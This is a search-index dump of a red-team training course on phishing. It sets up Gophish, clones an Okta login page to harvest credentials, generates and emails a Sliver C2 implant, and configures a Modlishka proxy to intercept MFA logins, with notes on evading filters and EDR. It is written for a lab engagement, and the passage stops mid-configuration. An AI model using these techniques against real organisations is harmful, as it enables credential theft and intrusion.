[{"body":" Domain TakeoversDomain takeovers or subdomain takeovers occur when DNS records are not properly updated or removed when a service is moved or shut down. Best case the domain just doesn’t work anymore. Worst case a threat actor can leverage 3rd party services to serve malicious content using your domain / brand.\n","categories":["How To"],"description":"Information on how specific services protect (or don't) against domain takeovers (DTO)","excerpt":"Information on how specific services protect (or don't) against domain …","ref":"/docs/domain-takeovers/","tags":["Domain Takeover"],"title":"Domain Takeovers"},{"body":"Learn how to run successful phishing campaigns.\n","categories":["How To"],"description":"Learn how to phish using payloads and credential harvesting with TFA interception.","excerpt":"Learn how to phish using payloads and credential harvesting with TFA …","ref":"/docs/phishing-credential-harvesting-and-beyond/","tags":["Phishing"],"title":"Phishing Credential Harvesting and Beyond"},{"body":"Currently, Firebase protects against domain takeovers by requiring each domain to have a unique CNAME or TXT record on the affected domain.\n","categories":"","description":"Firebase domain takeovers\n","excerpt":"Firebase domain takeovers\n","ref":"/docs/domain-takeovers/05-firebase/","tags":"","title":"Firebase"},{"body":"Hopefully this describes you:\nHuman. Proficient with Linux terminal usage. Manage / edit files in GUIs and terminals. Have a laptop with the following: Ability to run a Linux VM (not required for on site trainings). WiFi card. A web browser. Proficient with docker and docker compose. Desire to learn, sometimes the hard way (eg: troubleshooting). ??? ","categories":"","description":"","excerpt":"Hopefully this describes you:\nHuman. Proficient with Linux terminal …","ref":"/docs/phishing-credential-harvesting-and-beyond/05-preqs/","tags":"","title":"Prerequisites"},{"body":"Currently, Squarespace protects against domain takeovers by requiring each domain to have a unique CNAME record on the affected domain.\n","categories":"","description":"Squarespace domain takeovers\n","excerpt":"Squarespace domain takeovers\n","ref":"/docs/domain-takeovers/05-squarespace/","tags":"","title":"Squarespace"},{"body":"Setting the stage for things to come.\nWe are going to setup phishing infrastructure. Our infrastructure will allow us to: Manage phishing campaigns (Gophish). Send emails (MailHog for testing, ??? for production). Coordinate requests between users and a login provider (Modlishka). Hide from detections / bots. Acquire a CSV of users to target (First Name, Last Name, Email, Role). ","categories":"","description":"","excerpt":"Setting the stage for things to come.\nWe are going to setup phishing …","ref":"/docs/phishing-credential-harvesting-and-beyond/10-introduction/","tags":"","title":"Introduction"},{"body":" Skip this section if taking the training. The lab should already have this.\nWe’ll be using a few different VMs throughout this process. Let’s kick off the downloads now since they make take some time to complete.\nUbuntu LTS Windows 10 Op VMWe need a place to deploy all our stuff. For this workshop, we’ll be using VirtualBox and the latest Ubuntu LTS (22.04 LTS). Ubuntu has a great walk through on how to do this.\nInstall ToolingWe need a handful of tools to accomplish our goals\ngit docker (podman-docker) following: https://docs.docker.com/engine/install/ubuntu/\nsudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ git vim sudo mkdir -m 0755 -p /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg echo \\ \"deb [arch=\"$(dpkg --print-architecture)\" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ \"$(. /etc/os-release \u0026\u0026 echo \"$VERSION_CODENAME\")\" stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null sudo apt-get update sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin I also installed VS Code (https://code.visualstudio.com/sha/download?build=stable\u0026os=linux-deb-x64)\nTesting windows implantsTo test windows implants on Linux, install wine (https://wiki.winehq.org/Ubuntu):\nsudo dpkg --add-architecture i386 sudo mkdir -pm755 /etc/apt/keyrings\\nsudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key sudo wget -NP /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/ubuntu/dists/jammy/winehq-jammy.sources sudo apt update sudo apt install --install-recommends winehq-stable Now a quick test in a terminal:\nwine cmd.exe You may get some prompts to follow, you should follow them… Eventually you should get a nice cmd.exe prompt.\nDocker DNS MagicIn an effort to make things more clear and easier to understand while we hop through browser tabs and URLS, we’ll want to set up some DNS magic for our docker containers. This requires us to replace the default systemd-resolved in Ubuntu with dnsmasq. Then we’ll use a program to populate dnsmasq configuration with docker container information. This step is only for local testing.\nThis article came in handy to switch to dnsmasq. In addition to that article, we’ll also need to add the following to the dnsmasq.conf\nconf-dir=/etc/dnsmasq.d Now we need to install Golang so we can build docker-dnsmasq.\nsudo apt install golang go install github.com/defektive/docker-dnsmasq@latest Now would be a good time to add ~/go/bin to our $PATH.\nNow we should be able to run this in a new terminal window:\nsudo `which docker-dnsmasq` daemon We can test everything is working properly by starting a container with the VIRTUAL_HOST environment variable. Then pinging that docker container VIRTUAL_HOST name.\nsudo docker run --rm -e VIRTUAL_HOST=mailhog.docker mailhog/mailhog ping mailhog.docker We should also be able to ping random subdomains:\nping asdasd.mailhog.docker Windows VMWe’ll want a Windows box to do a little bit of payload development and testing. Once windows is installed, we’ll need to install Visual Studio Community. When configuring visual studio select .NET Development.\nhttps://learn.microsoft.com/en-us/dotnet/framework/install/dotnet-35-windows#enable-the-net-framework-35-in-control-panel\nChange networking to bridgedWe need to change our VM’s network settings to be bridge so they can talk to each other.\nInstall Guest UtilsWe should install virtualbox guest utils. This will make things much easier when we want to share things between our VMs.\n","categories":"","description":"","excerpt":" Skip this section if taking the training. The lab should already have …","ref":"/docs/phishing-credential-harvesting-and-beyond/15.5-infrastructure/","tags":"","title":"Infrastructure"},{"body":"These should be considered in real engagements\nDomain reputation. Impossible travel detection’s. Target acquisition. Lightly covered. Designing target specific campaigns. ??? Probably more… ","categories":"","description":"","excerpt":"These should be considered in real engagements\nDomain reputation. …","ref":"/docs/phishing-credential-harvesting-and-beyond/15-not-covered/","tags":"","title":"What isn't covered?"},{"body":" This is for onsite training. Skip this section if not taking training.\nConnect to the lab networkConnecting to the lab environment.\nWiFi Name: SaintConPhishingTraining WiFi_Pass: I can haz teh phish now? Sign in to the lab environmentOnce connected to the Wi-Fi, open the lab environment URL.\nhttps://console.lab.dfktv:8443/#/\nUse your supplied credentials to login.\nYou should see two VM connections waiting for you.\nSuccess!Welcome to the SAINTCON Phishing Security team! We have been tasked to perform a social engagement. You will be the lead operator on the engagement. Continue to the RoE when instructed to do so.\n","categories":"","description":"","excerpt":" This is for onsite training. Skip this section if not taking …","ref":"/docs/phishing-credential-harvesting-and-beyond/16-lab-connect/","tags":"","title":"Lab Environment"},{"body":" This is for onsite training. Skip this section if not taking training.\nSAINTCON Phishing has been tasked to perform a penetration test against SnakShare’s information systems and employees. SnakShare recently implemented new email security protections.\nScope snakshare.com and any subdomains mail.snakshare.com auth.snakshare.com Rules of Engagement Target email addresses will NOT be supplied. Test PlanEffektive Ops will conduct the following.\nPerform OSINT against SnakShare. Compile a list of potential SnakShare employees and email addresses. Perform a phishing engagement against discovered employees. Harvest credentials. Deploy C2 agent on to victim machines. ","categories":"","description":"","excerpt":" This is for onsite training. Skip this section if not taking …","ref":"/docs/phishing-credential-harvesting-and-beyond/16.5-roe/","tags":"","title":"Lab Environment: Rules of Engagement"},{"body":"","categories":"","description":"","excerpt":"","ref":"/blog/random/","tags":"","title":"Random"},{"body":"We need a nice place to organize and store everything. For this exercise, we’ll use ~/Desktop/op. We’ll also need a docker directory to put our docker configuration in.\nmkdir -p ~/Desktop/op/docker touch ~/Desktop/op/docker/docker-compose.yml ","categories":"","description":"","excerpt":"We need a nice place to organize and store everything. For this …","ref":"/docs/phishing-credential-harvesting-and-beyond/20-setup-op-dir/","tags":"","title":"Setup Operations Directory"},{"body":"It is time to perform OSINT on our target….\nhost snakshare.com We should see something like this.\n➜ ~ host snakshare.com snakshare.com has address 162.255.119.59 snakshare.com mail is handled by 10 eforward3.registrar-servers.com. snakshare.com mail is handled by 20 eforward5.registrar-servers.com. snakshare.com mail is handled by 15 eforward4.registrar-servers.com. snakshare.com mail is handled by 10 eforward1.registrar-servers.com. snakshare.com mail is handled by 10 eforward2.registrar-servers.com. I like to do a reverse host look up.\nhost 162.255.119.59 But that gives us nothing….\n➜ ~ host 162.255.119.59 Host 59.119.255.162.in-addr.arpa. not found: 3(NXDOMAIN) Do a whois on the IP address.\nwhois 162.255.119.59 This gives us lots of info.\n➜ ~ whois 162.255.119.59 # # ARIN WHOIS data and services are subject to the Terms of Use # available at: https://www.arin.net/resources/registry/whois/tou/ # # If you see inaccuracies in the results, please report at # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/ # # Copyright 1997-2023, American Registry for Internet Numbers, Ltd. # NetRange: 162.255.116.0 - 162.255.119.255 CIDR: 162.255.116.0/22 NetName: NCNET-5 NetHandle: NET-162-255-116-0-1 Parent: NET162 (NET-162-0-0-0-0) NetType: Direct Allocation OriginAS: AS16626, AS174, AS3356, AS4323, AS22612, AS32421 Organization: Namecheap, Inc. (NAMEC-4) RegDate: 2014-05-14 Updated: 2015-03-24 Comment: http://namecheap.com Comment: for any abuse please use: abuse@namecheap.com Ref: https://rdap.arin.net/registry/ip/162.255.116.0 OrgName: Namecheap, Inc. OrgId: NAMEC-4 Address: 11400 W. Olympic Blvd. Suite 200 City: Los Angeles StateProv: CA PostalCode: 90064 Country: US RegDate: 2011-01-28 Updated: 2017-01-28 Ref: https://rdap.arin.net/registry/entity/NAMEC-4 ReferralServer: rwhois://whois.namecheaphosting.com:4321 OrgAbuseHandle: ABUSE2885-ARIN OrgAbuseName: Abuse team OrgAbusePhone: +1-323-375-2822 OrgAbuseEmail: abuse@namecheaphosting.com OrgAbuseRef: https://rdap.arin.net/registry/entity/ABUSE2885-ARIN OrgTechHandle: EFIME-ARIN OrgTechName: Efimenko, Igor OrgTechPhone: +1-323-375-2822 OrgTechEmail: igor.e@namecheap.com OrgTechRef: https://rdap.arin.net/registry/entity/EFIME-ARIN OrgTechHandle: TECHT4-ARIN OrgTechName: Tech team OrgTechPhone: +1-323-375-2822 OrgTechEmail: tech@namecheaphosting.com OrgTechRef: https://rdap.arin.net/registry/entity/TECHT4-ARIN # # ARIN WHOIS data and services are subject to the Terms of Use # available at: https://www.arin.net/resources/registry/whois/tou/ # # If you see inaccuracies in the results, please report at # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/ # # Copyright 1997-2023, American Registry for Internet Numbers, Ltd. # Found a referral to whois.namecheaphosting.com:4321. %rwhois V-1.0,V-1.5:00090h:00 billing.web-hosting.com (Ubersmith RWhois Server V-4.5.5) autharea=162.255.119.0/24 xautharea=162.255.119.0/24 network:Class-Name:network network:Auth-Area:162.255.119.0/24 network:ID:NET-79087.162.255.119.0/24 network:Network-Name:anycast-edge-fwd-range network:IP-Network:162.255.119.0/24 network:IP-Network-Block:162.255.119.0 - 162.255.119.255 network:Org-Name:Web-hosting.com network:Street-Address:900 N. Alameda St., Suite 220 network:City:Los Angeles network:State:CA network:Postal-Code:90012 network:Country-Code:US network:Tech-Contact:MAINT-79087.162.255.119.0/24 network:Created:20190523133959000 network:Updated:20190523163000000 network:Updated-By:net-admin@namecheap.com contact:POC-Name:Network team contact:POC-Email:net-admin@namecheap.com contact:POC-Phone: contact:Tech-Name:Network team contact:Tech-Email:net-admin@namecheap.com contact:Tech-Phone: contact:Abuse-Name:Abuse team contact:Abuse-Email:abuse@namecheaphosting.com %ok We can see this IP address belongs to Namecheap. Probably sitting there for the default settings that redirect domain to the www. subdomain. Lets curl it.\ncurl -i snakshare.com Yep! just a redirect to www.snakshare.com.\n➜ ~ curl -i snakshare.com HTTP/1.1 302 Found Date: Fri, 20 Oct 2023 01:52:52 GMT Content-Type: text/html; charset=utf-8 Content-Length: 48 Connection: keep-alive Location: https://www.snakshare.com X-Served-By: Namecheap URL Forward Server: namecheap-nginx \u003ca href='https://www.snakshare.com'\u003eFound\u003c/a\u003e. Repeat those steps for the www subdomain.\nhost www.snakshare.com Lets examine the output.\n➜ ~ host www.snakshare.com www.snakshare.com is an alias for snakshare.github.io. snakshare.github.io has address 185.199.109.153 snakshare.github.io has address 185.199.111.153 snakshare.github.io has address 185.199.108.153 snakshare.github.io has address 185.199.110.153 snakshare.github.io has IPv6 address 2606:50c0:8000::153 snakshare.github.io has IPv6 address 2606:50c0:8003::153 snakshare.github.io has IPv6 address 2606:50c0:8001::153 snakshare.github.io has IPv6 address 2606:50c0:8002::153 This looks a little different. We have an alias to snakshare.github.io.\nhost 185.199.109.153 A host lookup on the IP reveals a GitHub domain.\n➜ ~ host 185.199.109.153 153.109.199.185.in-addr.arpa domain name pointer cdn-185-199-109-153.github.com. We can doubly confirm, with a whois on the IP.\nwhois 185.199.109.153 ➜ ~ whois 185.199.109.153 % This is the RIPE Database query service. % The objects are in RPSL format. % % The RIPE Database is subject to Terms and Conditions. % See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions % Note: this output has been filtered. % To receive output for a database update, use the \"-B\" flag. % Information related to '185.199.108.0 - 185.199.111.255' % Abuse contact for '185.199.108.0 - 185.199.111.255' is 'abuse@github.com' inetnum: 185.199.108.0 - 185.199.111.255 netname: US-GITHUB-20170413 country: US org: ORG-GI58-RIPE admin-c: GA9828-RIPE tech-c: NO1444-RIPE status: ALLOCATED PA mnt-by: RIPE-NCC-HM-MNT mnt-by: us-github-1-mnt created: 2017-04-13T15:36:35Z last-modified: 2018-12-14T10:48:39Z source: RIPE organisation: ORG-GI58-RIPE org-name: GitHub, Inc. country: US org-type: LIR address: 88 Colin P. Kelly Jr. Street address: 94107 address: San Francisco address: UNITED STATES phone: +1 415 735 4488 admin-c: GA9828-RIPE tech-c: NO1444-RIPE abuse-c: AR39914-RIPE mnt-ref: us-github-1-mnt mnt-by: RIPE-NCC-HM-MNT mnt-by: us-github-1-mnt created: 2017-04-11T08:28:46Z last-modified: 2020-12-16T13:16:10Z source: RIPE # Filtered role: GitHub Admin address: 88 Colin P. Kelly Jr. Street address: 94107 address: San Francisco address: UNITED STATES nic-hdl: GA9828-RIPE mnt-by: us-github-1-mnt created: 2017-04-18T22:16:30Z last-modified: 2017-04-18T22:18:03Z source: RIPE # Filtered abuse-mailbox: abuse@github.com org: ORG-GI58-RIPE role: GitHub Network Operations address: 88 Colin P. Kelly Jr. Street address: 94107 address: San Francisco address: California address: UNITED STATES nic-hdl: NO1444-RIPE mnt-by: us-github-1-mnt created: 2017-04-18T20:05:01Z last-modified: 2017-04-18T22:19:53Z source: RIPE # Filtered org: ORG-GI58-RIPE admin-c: GA9828-RIPE abuse-mailbox: abuse@github.com % Information related to '185.199.109.0/24AS36459' route: 185.199.109.0/24 origin: AS36459 mnt-by: us-github-1-mnt created: 2017-04-18T21:02:25Z last-modified: 2017-04-18T21:02:25Z source: RIPE org: ORG-GI58-RIPE descr: GitHub - 185.199.109.0/24 organisation: ORG-GI58-RIPE org-name: GitHub, Inc. country: US org-type: LIR address: 88 Colin P. Kelly Jr. Street address: 94107 address: San Francisco address: UNITED STATES phone: +1 415 735 4488 admin-c: GA9828-RIPE tech-c: NO1444-RIPE abuse-c: AR39914-RIPE mnt-ref: us-github-1-mnt mnt-by: RIPE-NCC-HM-MNT mnt-by: us-github-1-mnt created: 2017-04-11T08:28:46Z last-modified: 2020-12-16T13:16:10Z source: RIPE # Filtered % This query was served by the RIPE Database Query Service version 1.108 (SHETLAND) ","categories":"","description":"","excerpt":"It is time to perform OSINT on our target….\nhost snakshare.com We …","ref":"/docs/phishing-credential-harvesting-and-beyond/24-osint/","tags":"","title":"OSINT"},{"body":"MailHog is an SMTP server used for testing various applications that send emails. It provides a simple web interface to view what messages have been sent. Let’s edit our new ~/Desktop/op/docker/docker-compose.yml file and add the following to configure MailHog.\nversion: \"3\" services: mailhog: image: mailhog/mailhog container_name: mailhog environment: - VIRTUAL_HOST=mailhog.docker logging: driver: 'none' # disable saving logs Now we should be able to bring up our docker compose environment to test that it is working.\ncd ~/Desktop/op/docker/ sudo docker compose up Let’s open up the web interface now http://mailhog.docker:8025/.\n","categories":"","description":"","excerpt":"MailHog is an SMTP server used for testing various applications that …","ref":"/docs/phishing-credential-harvesting-and-beyond/25-mailhog/","tags":"","title":"Mailhog"},{"body":" GophishLet’s create a file for our Gophish configuration:\nmkdir -p ~/Desktop/op/docker/gophish touch ~/Desktop/op/docker/gophish/config.json { \"admin_server\": { \"listen_url\": \"0.0.0.0:3333\", \"use_tls\": false, \"cert_path\": \"gophish_admin.crt\", \"key_path\": \"gophish_admin.key\", \"trusted_origins\": [] }, \"phish_server\": { \"listen_url\": \"0.0.0.0:80\", \"use_tls\": false, \"cert_path\": \"example.crt\", \"key_path\": \"example.key\" }, \"db_name\": \"sqlite3\", \"db_path\": \"gophish.db\", \"migrations_prefix\": \"db/db_\", \"contact_address\": \"\", \"logging\": { \"filename\": \"\", \"level\": \"\" } } Now we can add Gophish to our docker-compose services.\ngophish: image: gophish/gophish container_name: \"gophish\" environment: - VIRTUAL_HOST=gophish.docker links: - \"mailhog\" volumes: - \"gophish:/opt/gophish\" - \"./gophish/config.json:/opt/gophish/config.json\" Finally, we need to add a Gophish named volume to the end:\nvolumes: gophish: We should be able to bring up docker compose now:\nsudo docker compose up We need a password to log in to Gophish. Gophish automatically sets a password when you first start it. So lets open a new terminal and run the following.\ncd ~/Desktop/op/docker sudo docker compose logs gophish | grep \" password \" Open http://gophish.docker:3333/. login with the user admin and the password you found in the logs. change password (I used gophishpass for the VM). Gophish SMTP MailHogGo to Sending Profiles \u003e + New Sending Profile.\nSet Name to Mailhog SMTP Testing Server. Set SMTP From to an email, I used admin@phishing.test. Set Host to mailhog:1025, as this is the name of the linked container in the docker compose file. Add a new Email Header X-Mailer and set it to Outlook. This overrides Gophish’s default of Gophish. Click Send Test Email. Fill out the fields with mostly random things. We should see a nice testing email in MailHog Since everything is working, Click Save on the send profile. ","categories":"","description":"","excerpt":" GophishLet’s create a file for our Gophish configuration:\nmkdir -p …","ref":"/docs/phishing-credential-harvesting-and-beyond/30-gophish/","tags":"","title":"Gophish"},{"body":"","categories":"","description":"","excerpt":"","ref":"/blog/updates/","tags":"","title":"Updates"},{"body":"Where can we acquire targets?\nLinkedIn Pros Useful job role information. Usually up to date. Cons Most likely violates LinkedIn policy if automated. Automation is brittle and requires updates when changes are made. Breach Dumps Pros Could find valid passwords. Confirm email address formatting. cool services like Dehashed mean you don’t have to maintain the data. Cons Outdated. Lots of data. Source Control Pros Easy to get. Commit dates give an idea at how recently the information was valid. Also acquire personal emails. Cons Sometimes lots of repos. Probably more. ","categories":"","description":"","excerpt":"Where can we acquire targets?\nLinkedIn Pros Useful job role …","ref":"/docs/phishing-credential-harvesting-and-beyond/31-target-aquistion/","tags":"","title":"Target Acquisition"},{"body":"Go to GitHub and see what we can find. Open https://github.com/snakshare.\nmkdir -p ~/Desktop/op/code/github.com/snakshare cd ~/Desktop/op/code/github.com/snakshare git clone https://github.com/SnakShare/snakshare.github.io.git Now we can get a list of users and email addresses.\ngit log --pretty=\"format:%aN, %ae%n%cN, %ce\" | sort -u | tee ~/Desktop/op/git-users.csv ","categories":"","description":"","excerpt":"Go to GitHub and see what we can find. Open …","ref":"/docs/phishing-credential-harvesting-and-beyond/32-target-aquistion-git/","tags":"","title":"Target Acquisition: Git"},{"body":" Create a new landing page. open https://someplace.okta.com/ open dev console (f12) in console run: let s = document.getElementsByTagName('script'); while (s[0]) { s[0].parentNode.removeChild(s[0])} right click web page \u003e inspect element. find top HTML tag. right click \u003e copy \u003e outer HTML. paste HTML in landing page. check capture data. check capture password. set redirect to https://www.okta.com/404.html Create a new email templateBe sure to include {{.URL}} ref\nName: Basic credential Harvesting Envelope Sender: guy@target.docker Subject: Account Security Feature Upgrade Text:\nAll, We are upgrading the security around our authentication services. Please login ({{.URL}}) to enable these new features. Thanks - Guy Withaface IT HTML:\n\u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eAll,\u003c/p\u003e \u003cp\u003eWe are upgrading the security around our authentication services. Please \u003ca href=\"{{.URL}}\"\u003elogin to enable these new features\u003c/a\u003e.\u003c/p\u003e \u003cp\u003eThanks\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e Create a new group to be our targetWe can download the CSV template and populate it with our users we found earlier. Then import the CSV template.\nCreate new Campaign that uses the above. Use http://gophish.docker/this/path/doesnt/matter for the URL. Test email in MailHog Open MailHog\nclick link. attempt to log in with fake credentials. ","categories":"","description":"","excerpt":" Create a new landing page. open https://someplace.okta.com/ open dev …","ref":"/docs/phishing-credential-harvesting-and-beyond/35-basic-cred-harvest/","tags":"","title":"Basic Credential Harvesting"},{"body":"This current setup would allow you to do basic credential harvesting phishing campaigns. Which may work on some organizations. However, Many modern organizations usually have additional protections. The following protections are standard security practices:\nRequire MFA. Email filtering (though most services provide a basic filter). Email link protections (fancy bots to analyze link content before allowing users to visit the URL). Domain monitoring (Certificate transparency logs for look alike domains). Endpoint Protections. ","categories":"","description":"","excerpt":"This current setup would allow you to do basic credential harvesting …","ref":"/docs/phishing-credential-harvesting-and-beyond/40-state-review-1/","tags":"","title":"State Review I"},{"body":" Basic Payload Delivery: SliverSliver is an open source C2\nhttps://github.com/BishopFox/sliver/wiki/Getting-Started https://github.com/BishopFox/sliver/releases Download the latest release and put in your $PATH. We should already have our dependencies installed when we set up the infrastructure.\nmkdir ~/bin wget -O ~/bin/sliver-server_linux https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux chmod +x ~/bin/sliver-server_linux ","categories":"","description":"","excerpt":" Basic Payload Delivery: SliverSliver is an open source C2 …","ref":"/docs/phishing-credential-harvesting-and-beyond/45-implant-setup/","tags":"","title":"Implant Setup With Sliver"},{"body":" Generate a new implantmkdir -p ~/Desktop/op/sliver/implants cd ~/Desktop/op/sliver sliver-server_linux We should now be in a sliver shell.\nNow we can generate a test implant:\ngenerate --mtls 127.0.0.1 --save implants/default-sliver.exe Testing implantIn the sliver shell:\nmtls In a new terminal window:\nwine ~/Desktop/op/sliver/implants/default-sliver.exe Now we can use the implant by calling use [session id]:\n","categories":"","description":"","excerpt":" Generate a new implantmkdir -p ~/Desktop/op/sliver/implants cd …","ref":"/docs/phishing-credential-harvesting-and-beyond/50-generating-sliver-implant/","tags":"","title":"Sliver: Generating an implant"},{"body":" Copy first template. Add file attachment. Update words. Create new Campaign that uses the above. The landing page can stay the same, it is actually not used since we removed it from the template. wait for the email to send… The default sliver executable is ~15MB so it may take sometime for it to send…. You can find the attachment under the MIME tab. ","categories":"","description":"","excerpt":" Copy first template. Add file attachment. Update words. Create new …","ref":"/docs/phishing-credential-harvesting-and-beyond/55-basic-implant-delivery/","tags":"","title":"Basic Implant Delivery"},{"body":" How can we make this better?We need:\nIntercept MFA requests. We are already tricking the user to visiting our site, so this is easier than it sounds. Use invisible HTML tags to bypass email filtering. Detect bots and show them benign pages. Ensure our domains do not match the target or prominent service provider. Obfuscate payloads to bypass EDR protections. ","categories":"","description":"","excerpt":" How can we make this better?We need:\nIntercept MFA requests. We are …","ref":"/docs/phishing-credential-harvesting-and-beyond/60-state-review-ii/","tags":"","title":"State Review II"},{"body":" ModlishkaModlishka is an amazing tool that can mirror a website on the fly, rewriting links to ensure the site functions. This allows us to essentially MitM connections to our targeted service from a domain we control.\nCheckout of Modlishka and get things setup to be run in docker.\nmkdir ~/Desktop/op/docker/modlishka cd ~/Desktop/op/docker/modlishka mkdir modlishka-data touch modlishka-data/config.json git clone https://github.com/Stage2Sec/Modlishka.git cd Modlishka cp extra/docker/* . Modlishka can take command line arguments or a configuration file. We are opting to use the configuration file. Add the following to ~/Desktop/op/docker/modlishka/modlishka-data/config.json\n{ \"proxyDomain\": \"modlishka.docker\", \"target\": \"testphp.vulnweb.com\", \"trackingCookie\": \"iamadumbcookie\", \"trackingParam\": \"rid\", \"controlCreds\": \"phisherman:phisherpass\", \"controlURL\": \"livewell\", \"terminateRedirectUrl\": \"\", \"terminateTriggers\": \"/nowhere\", \"allowSecureCookies\": true, \"listeningAddress\": \"0.0.0.0\", \"targetResources\": \"\", \"jsRules\": \"\", \"jsReflectParam\": \"reflect\", \"proxyAddress\": \"\", \"forceHTTPS\": false, \"forceHTTP\": false, \"dynamicMode\": false, \"debug\": true, \"logPostOnly\": false, \"disableSecurity\": false, \"log\": \"/data/creds.log\", \"plugins\": \"all\", \"cert\": \"\", \"certKey\": \"\", \"certPool\": \"\", \"rules\": \"\", \"credParams\": \"\" } The trackingParam value is what Modlishka uses to determine what visits belong to what users, we’ll map this to rid since that is what Gophish uses by default.\nNow we can add Modlishka to our docker compose services.\nmodlishka: build: context: \"modlishka/Modlishka/\" entrypoint: /bin/proxy command: -config /data/config.json container_name: modlishka environment: - VIRTUAL_HOST=modlishka.docker volumes: - \"./modlishka/modlishka-data:/data\" Lets test it out. Lets stop docker compose and restart it:\nsudo docker compose up Now open http://modlishka.docker/. We should see the Accunetix test site being hosted from our fake domain.\n","categories":"","description":"","excerpt":" ModlishkaModlishka is an amazing tool that can mirror a website on …","ref":"/docs/phishing-credential-harvesting-and-beyond/65-modlishka/","tags":"","title":"Modlishka"},{"body":" If attending a live training, skip this section\nNow that we have Modlishka up and running. Let’s get it configured with a target login provider. We’ll use Authentik to get an Okta like experience.\nmkdir ~/Desktop/op/docker/authentik cd ~/Desktop/op/docker/ echo \"PG_PASS=dumbpassword\" \u003e\u003e .env echo \"AUTHENTIK_SECRET_KEY=supersecretkeythatpaullikes\" \u003e\u003e .env echo \"AUTHENTIK_ERROR_REPORTING__ENABLED=true\" \u003e\u003e .env Add the follow for emails…\n# SMTP Host Emails are sent to AUTHENTIK_EMAIL__HOST=mailhog AUTHENTIK_EMAIL__PORT=1025 # Optionally authenticate (don't add quotation marks to your password) AUTHENTIK_EMAIL__USERNAME= AUTHENTIK_EMAIL__PASSWORD= # Use StartTLS AUTHENTIK_EMAIL__USE_TLS=false # Use SSL AUTHENTIK_EMAIL__USE_SSL=false AUTHENTIK_EMAIL__TIMEOUT=10 # Email address authentik will send from, should have a correct @domain AUTHENTIK_EMAIL__FROM=authentik@target.docker Now we’ll merge their docker-compose.yml with ours (ref). We’ll start with the services.\nauthentik-postgresql: image: docker.io/library/postgres:12-alpine restart: unless-stopped healthcheck: test: [\"CMD-SHELL\", \"pg_isready -d $${POSTGRES_DB} -U $${POSTGRES_USER}\"] start_period: 20s interval: 30s retries: 5 timeout: 5s volumes: - database:/var/lib/postgresql/data environment: - POSTGRES_PASSWORD=${PG_PASS:?database password required} - POSTGRES_USER=${PG_USER:-authentik} - POSTGRES_DB=${PG_DB:-authentik} env_file: - .env authentik-redis: image: docker.io/library/redis:alpine command: --save 60 1 --loglevel warning restart: unless-stopped healthcheck: test: [\"CMD-SHELL\", \"redis-cli ping | grep PONG\"] start_period: 20s interval: 30s retries: 5 timeout: 3s volumes: - redis:/data authentik-server: image: ${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2023.3.1} restart: unless-stopped command: server environment: VIRTUAL_HOST: target.docker AUTHENTIK_REDIS__HOST: authentik-redis AUTHENTIK_POSTGRESQL__HOST: authentik-postgresql AUTHENTIK_POSTGRESQL__USER: ${PG_USER:-authentik} AUTHENTIK_POSTGRESQL__NAME: ${PG_DB:-authentik} AUTHENTIK_POSTGRESQL__PASSWORD: ${PG_PASS} volumes: - ./authentik/media:/media - ./authentik/custom-templates:/templates env_file: - .env ports: - \"${AUTHENTIK_PORT_HTTP:-9000}:9000\" - \"${AUTHENTIK_PORT_HTTPS:-9443}:9443\" authentik-worker: image: ${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2023.3.1} restart: unless-stopped command: worker environment: AUTHENTIK_REDIS__HOST: authentik-redis AUTHENTIK_POSTGRESQL__HOST: authentik-postgresql AUTHENTIK_POSTGRESQL__USER: ${PG_USER:-authentik} AUTHENTIK_POSTGRESQL__NAME: ${PG_DB:-authentik} AUTHENTIK_POSTGRESQL__PASSWORD: ${PG_PASS} # `user: root` and the docker socket volume are optional. # See more for the docker socket integration here: # https://goauthentik.io/docs/outposts/integrations/docker # Removing `user: root` also prevents the worker from fixing the permissions # on the mounted folders, so when removing this make sure the folders have the correct UID/GID # (1000:1000 by default) user: root volumes: - /var/run/docker.sock:/var/run/docker.sock - ./authentik/media:/media - ./authentik/certs:/certs - ./authentik/custom-templates:/templates env_file: - .env We also need to update our volumes:\nvolumes: database: driver: local redis: driver: local Test it out.\nsudo docker compose up Now open http://auth.target.docker:9000/if/flow/initial-setup/. We should see a simple setup page.\nSetup MFA\n","categories":"","description":"","excerpt":" If attending a live training, skip this section\nNow that we have …","ref":"/docs/phishing-credential-harvesting-and-beyond/70-modlishka-sso/","tags":"","title":"Setup MFA Authentication Provider"},{"body":"Let’s go through the authentication flow to determine what the username and password fields when conducting a normal login. First thing we want to do is open developer tools and ensure Persist Logs is checked.\nNow we can fill out the username field, press login, then look for the POST request.\nFill out our password and do the same.\nWe can see that the fields are uid_field and password.\nNow we need to find a URL path that is only hit when the target successfully logs in. Finish the authentication process by completing the MFA challenge.\nLets use /if/user.\nNow we need to determine the session cookie.\nLooks like authentik_session maybe the one we are after. We are lucky they used descriptive names and very few cookies.\nSince we are testing in a lab environment, we need to configure modlishka to allow connections to private IPs. Change disableSecurity to true in the config.json file.\n\"disableSecurity\": true, We have all the required information to reconfigure Modlishka. Now we need to start updating Modlishka configuration. We’ll start with the \"target\" in Modlishka’s configuration.\nIf you are in a live training, we’ll want to configure are target to be the targets auth server.\n\"target\": \"auth.snakshare.com\", If not in a training this should be sufficient.\n\"target\": \"auth.target.docker:9000\", Now we need to create some regular expressions to match the username and password fields.\necho -n '\"uid_field\":\\s*\"(.+?)\"' | base64 echo -n '\"password\":\\s*\"(.+?)\"' | base64 We’ll join these two values together with a comma, then update the \"credParams\" configuration value.\n\"credParams\": 